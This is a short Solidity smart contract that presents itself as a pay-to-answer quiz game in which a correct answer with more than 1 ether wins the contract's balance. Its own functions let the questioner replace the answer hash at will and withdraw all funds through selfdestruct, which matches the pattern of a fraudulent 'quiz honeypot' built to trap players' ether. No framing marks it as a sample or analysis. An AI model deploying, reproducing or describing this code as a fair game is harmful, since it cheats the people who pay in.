pragma solidity ^0.4.20;

contract try_to_play
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    string public question;
    
    address questionSender;
    
    bytes32 responseHash;
 
    function start_try_to_play(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    
    function StopGame() public payable onlyQuestionSender {
       selfdestruct(msg.sender);
    }
    
    function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {
        question = _question;
        responseHash = _responseHash;
    }
    
    function newQuestioner(address newAddress) public onlyQuestionSender {
        questionSender = newAddress;
    }
    
    modifier onlyQuestionSender(){
        require(msg.sender==questionSender);
        _;
    }
    
    function() public payable{}
}